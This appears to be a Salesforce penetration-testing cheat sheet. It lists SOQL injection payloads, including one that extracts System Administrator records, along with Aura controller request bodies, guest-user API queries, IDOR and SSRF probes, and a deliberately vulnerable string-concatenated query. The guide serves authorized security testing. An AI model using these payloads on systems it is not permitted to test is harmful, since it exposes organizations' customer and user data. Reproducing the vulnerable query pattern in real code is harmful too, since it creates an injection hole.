# Salesforce Security Testing

## Overview
Security testing for Salesforce applications including SOQL injection, Guest User access, and community/Experience Cloud vulnerabilities.

## Reconnaissance
```
# Salesforce detection
# Look for: force.com domains, salesforce.com references
# Login page: login.salesforce.com or custom domain
# Community/Experience Cloud: community.target.com, target.my.site.com

# Salesforce instance URL format:
https://[INSTANCE].salesforce.com
https://[COMPANY].my.salesforce.com

# API version discovery
GET /services/data/ → list all API versions
GET /services/data/v58.0/ → list resources for version
```

## Guest User Access (Unauthenticated)

### Experience Cloud / Community
```
# Guest user has limited Salesforce access
# Often misconfigured to expose too much

# REST API as guest user:
GET /services/apexrest/YOUR_ENDPOINT
GET /services/data/v58.0/query?q=SELECT+Id,Name+FROM+Account

# Check if guest profile has read on sensitive objects:
SELECT Id, Name, Email FROM Contact  (guest user shouldn't see this)
SELECT Id, Name, Phone FROM Lead

# Aura/Lightning endpoints
POST /aura
{"message":"...","aura.context":"...","aura.token":"..."}

# LWC (Lightning Web Components) endpoints
GET /lwc/component
```

## SOQL Injection
```
# Salesforce Object Query Language (like SQL)
# Injection in SOQL queries

# Basic test
' OR '1'='1
' UNION SELECT Id FROM User WHERE '1'='1

# Time-based blind (no UNION, limited syntax)
# SOQL has no sleep, but can use LIMIT and test responses

# SOQL in Visualforce/Apex
# Often in search parameters, filter fields

# Example vulnerable code:
String query = "SELECT Id FROM Account WHERE Name = '" + userInput + "'";

# Bypass with:
test' OR Name != '

# Extract user data:
test' OR Id IN (SELECT Id FROM User WHERE Profile.Name = 'System Administrator') OR Name = '
```

## Salesforce Lightning / Aura
```
# Aura component actions
POST /aura
{
  "message": {
    "descriptor": "aura://ApexActionController/ACTION$execute",
    "callingDescriptor": "UNKNOWN",
    "params": {
      "namespace": "",
      "classname": "YourController",
      "method": "methodName",
      "params": {},
      "cacheable": false
    }
  }
}

# Test with different classname/method combinations
# Check if authentication enforced on Apex controllers
```

## API Endpoints
```
# REST API (requires OAuth token)
GET /services/data/v58.0/sobjects → list all objects
GET /services/data/v58.0/sobjects/Account/describe → schema
GET /services/data/v58.0/query?q=SELECT+Id,Name+FROM+User

# Bulk API
GET /services/async/58.0/job

# Streaming API
/cometd/58.0/
```

## OAuth / Authentication
```
# Salesforce OAuth flows
# Authorization endpoint: https://login.salesforce.com/services/oauth2/authorize
# Token endpoint: https://login.salesforce.com/services/oauth2/token

# Connected App misconfiguration
# Overly permissive scopes
# No IP restrictions
# Refresh token abuse

# Test: can client_credentials grant be used?
# Test: refresh token rotation disabled?
```

## SSRF via Salesforce
```
# Apex callouts can make server-side HTTP requests
# If user can trigger Apex code with controlled URL → SSRF

# Outbound messaging webhooks
# Formula fields with hyperlinks may fetch external URLs

# Named credentials abuse
# Test if you can configure named credentials to internal URLs
```

## File Storage (Content/Attachments)
```
# Salesforce Files / ContentDocument
GET /services/data/v58.0/sobjects/ContentDocument/[ID]/VersionData

# Direct attachment access
# Check if files are accessible without authentication via static URLs

# ContentDocumentLink to expose files
```

## Misconfigured Sharing Rules
```
# Salesforce record access based on:
# - OWD (Organization-Wide Defaults)
# - Role hierarchy
# - Sharing rules
# - Manual sharing

# Test IDOR: can you access records of other accounts?
GET /services/data/v58.0/sobjects/Account/[ANOTHER_ACCOUNT_ID]

# Check OWD: if set to Public Read, all users can read all records of that type
```

## Testing Methodology
1. Identify Salesforce instance and communities
2. Test unauthenticated Guest User access to APIs
3. Test SOQL injection in search/filter parameters
4. Check Aura/Lightning component actions
5. Test for IDOR in record access (Account, Contact, Lead IDs)
6. Check file/attachment access controls
7. Test OAuth app configurations
8. Look for exposed Apex REST endpoints
9. Check sharing rules and OWD configuration

## Tools
- Salesforce Inspector (browser extension)
- Burp Suite for API testing
- `nuclei -t salesforce/` templates  
- Custom SOQL injection scripts
